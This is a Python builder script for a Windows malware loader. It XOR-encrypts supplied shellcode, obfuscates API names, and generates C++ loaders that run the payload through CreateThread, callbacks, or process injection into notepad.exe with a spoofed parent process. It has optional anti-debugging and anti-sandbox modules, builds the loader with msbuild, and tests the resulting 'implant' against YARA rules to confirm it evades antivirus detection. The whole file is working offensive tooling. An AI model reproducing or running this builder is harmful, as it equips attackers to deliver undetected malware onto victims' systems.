import binascii
import argparse
import subprocess
import random
import json
import string
import glob
import os
from tqdm import tqdm

def gen_string(length):
    randString = ''
    for i in range(length):
        randString += random.choice(list(string.ascii_letters + string.digits))

    return randString

def gen_var(length):
    randString = ''
    for i in range(length):
        randString += random.choice(list(string.ascii_letters))

    return randString

def init_args():
    parser = argparse.ArgumentParser(
                    prog='builder.py',
                    description='Build an executable payload with encrypted shellcode from a bin file',
                    epilog='AV is for nerds')
    
    parser.add_argument('-b', '--bin', help='The binary file to convert to nice unsigned char shellcode', 
                        required=True)

    parser.add_argument('-x', '--xor', help='XOR key to encrypt with', 
                        default=gen_string(256))
    
    # parser.add_argument('-x', '--xor', help='XOR key to encrypt with', 
    #                 default='')

    parser.add_argument('-ad', '--anti-debug', help='Enable anti debugging option', 
                        dest='debug', 
                        action='store_true')
    
    parser.add_argument('-as', '--anti-sandbox', help='Enable anti sandboxing/virtualization option', 
                        dest='sandbox', 
                        action='store_true')
    
    parser.add_argument('-y', '--yara', help='Enable local YARA scan of generated implant', 
                        dest='yara', 
                        action='store_true')
    
    parser.add_argument('-m', '--method', 
                        help='''Method to use to dynamically load functions.\nDInvoke: Use LoadLibraryA and GetProcAddress to get function pointers.\nPEBWalk: Grab a handle to the PEB and walk through the LDR table to find the hash for desired functions.''', 
                        choices=['dinvoke', 'pebwalk'],
                        dest='method',
                        default='dinvoke')
    parser.add_argument('-l', '--load', 
                        help='Method to use to load and execute shellcode.\n CreateThread: Generic invocation of CreateThread to start running the shellcode. Inject: Spawn a notepad.exe process in a suspended state with a spoofed PPID targeting explorer.exe then inject into it before using CreateRemoteThread.\nCallback: Register the shellcode as the callback function for the loaded shellcode to indirectly transfer execution flow it it.', 
                        choices=['createthread', 'inject', 'callback'],
                        default='callback')

    return parser.parse_args()

def xor(data, key):
    outBytes = b''
    keyLen = len(key)
    if not keyLen:
        return data
    for n, i in tqdm(enumerate(data)):
        outBytes += (i ^ key[n % keyLen]).to_bytes(1, "big")

    return outBytes

def gen_loader(funcMap: list, loadLoop: str, used: list):
    funcName = gen_var(12)
    # Example of a loadloop
    '''unsigned char <FUNC_NAME>[] = <MAPPED_FUNC>
    xor_data(<FUNC_NAME>, sizeof(<FUNC_NAME>), key, key_len);
    <FUNC_VAR> = (<FUNC_CONSTANT>)GetProcAddress(kernelHandle, (LPCSTR) <FUNC_NAME>);
    xor_data(<FUNC_NAME>, sizeof(<FUNC_NAME>), key, key_len);'''

    while funcName in used:
        funcName = gen_var(12)

    # Add a placeholder that can be replaced later
    loadLoop = loadLoop.replace('<MAPPED_FUNC>', funcMap[1])

    # Generate a variable name to assign the xored character array to
    loadLoop = loadLoop.replace('<FUNC_NAME>', funcName)
    used.append(funcName)

    # Get the actual type casting set up
    loadLoop = loadLoop.replace('<FUNC_CONSTANT>', funcMap[0].upper())
    loadLoop = loadLoop.replace('<FUNC_HASH>', funcMap[0].upper() + 'HASH')
    loadLoop = loadLoop.replace('<FUNC_VAR>', funcMap[0][0].lower() + funcMap[0][1:])
    return loadLoop


if __name__ == '__main__':
    args = init_args()
    used = []
    funcs = [('Kernel32.dll', '<KERNEL32>'), ('CreateThread', '<CREATE_THREAD>'), 
             ('VirtualAlloc', '<VIRTUAL_ALLOC>'), ('VirtualProtectEx', '<VIRTUAL_PROTECT_EX>'),
             ('VirtualProtect', '<VIRTUAL_PROTECT>'), ('CreateProcessA', '<CREATE_PROCESS_A>'), 
             ('OpenProcess', '<OPEN_PROCESS>'), ('VirtualAllocEx', '<VIRTUAL_ALLOC_EX>'), 
             ('WriteProcessMemory', '<WRITE_PROCESS_MEMORY>'), ('CreateRemoteThread', '<CREATE_REMOTE_THREAD>'),
             ('ResumeThread', '<RESUME_THREAD>')
             ]
    loadMethods = {
        'dinvoke': 'DInvoke',
        'pebwalk': 'PEBWalk'
    }

    # Load mappings for what techniques need what functions
    with open('mappings.json', 'r') as f:
        mappings = json.load(f)

    srcDir = 'src'
    funcDir = 'functionload'
    loadDir = 'load'


    # Open shellcode load method
    with open(os.path.join(srcDir, loadDir, args.load) + '.cpp', 'r') as f:
       source = f.read()

    # Open function load method
    with open(os.path.join(srcDir, funcDir, loadMethods[args.method], 'Boilerplate.cpp'), 'r') as f:
        boilerplate = f.read()

    with open(os.path.join(srcDir, funcDir, loadMethods[args.method], 'LoadLoop.cpp'), 'r') as f:
        loadLoop = f.read()

    # Insert function loading
    loadConstruct = boilerplate + '\n'
    for func in mappings['functionsNeeded'][args.load]:
        loadConstruct += gen_loader(func, loadLoop, used) + '\n\n'

    source = source.replace('<LOAD_FUNCTIONS>', loadConstruct)

    try:
        with open(args.bin, 'rb') as f:
            binData = f.read()
        
        print("Encrypting shellcode...")
        binData = xor(bytearray(binData), args.xor.encode())
        # print(binData)
        # quit()

        with open("src/headers/shellcode.h", "r") as header:
            headerData = header.read()

        headerData = headerData.replace('<XOR_KEY>', f'"{args.xor}"')

        with open("ShellcodeLoaderBuilder/shellcode.h", 'w') as f:
            f.write(headerData)

        with open("ShellcodeLoaderBuilder/binary_data.bin", 'wb') as f:
            f.write(binData)

        # stringConstruct = "unsigned char shellcode[] = \n\""

        # for n, i in enumerate(binData):
        #     stringConstruct += f"\\{hex(i)[1:]}"
        #     if (n + 1) % 14 == 0:
        #         stringConstruct += '"\n"'
        # stringConstruct += '";'
        # source = source.replace('<SHELLCODE>', stringConstruct)
        # source = source.replace('<XOR_KEY>', f'"{args.xor}"')

        # XOR and encrypt dynamic invoke stuff
        for func in funcs:
            data = xor(func[0].encode() + b'\0', args.xor.encode())
            stringConstruct = "\""
            for n, i in enumerate(data):
                stringConstruct += f"\\{hex(i)[1:]}"
            stringConstruct += '";'

            source = source.replace(func[1], stringConstruct)


        if args.debug:
            with open("src/evasion/antidebug.cpp", 'r') as f:
                antiDebug = f.read()
            source = source.replace('<ANTI_DEBUG>', antiDebug)
        else:
            source = source.replace('<ANTI_DEBUG>', 'void antiDebug(){}')

        if args.sandbox:
            with open("src/evasion/antisandbox.cpp", 'r') as f:
                antiDebug = f.read()
            source = source.replace('<ANTI_SANDBOX>', antiDebug)
        else:
            source = source.replace('<ANTI_SANDBOX>', 'void antiSandbox(){}')

        with open('ShellcodeLoaderBuilder/Source.cpp', 'w') as f:
            f.write(source)


        os.system("msbuild ShellcodeLoaderBuilder.sln /p:Configuration=Release /p:DebugSymbols=false /p:DebugType=None")
        os.remove("ShellcodeLoaderBuilder/Source.cpp")
        os.remove("ShellcodeLoaderBuilder/shellcode.h")
        os.remove("ShellcodeLoaderBuilder/binary_data.bin")

        if args.yara:
            import yara
            windows_filenames = glob.glob('rsc\\rules\\*.yar')
            rules_dict = {}
            for i in windows_filenames:
                rules_dict[os.path.split(i)[-1]] = i

            rules = yara.compile(filepaths=rules_dict)

            matches = rules.match('x64/Release/ShellcodeLoaderBuilder.exe')
            if matches:
                print("The implant matched the following rules:")
                for i in matches:
                    print(f'\t[!] {i}')

            else:
                print('Implant comes back clean from Elastic YARA Rules')

    except FileNotFoundError:
        print('Invalid file')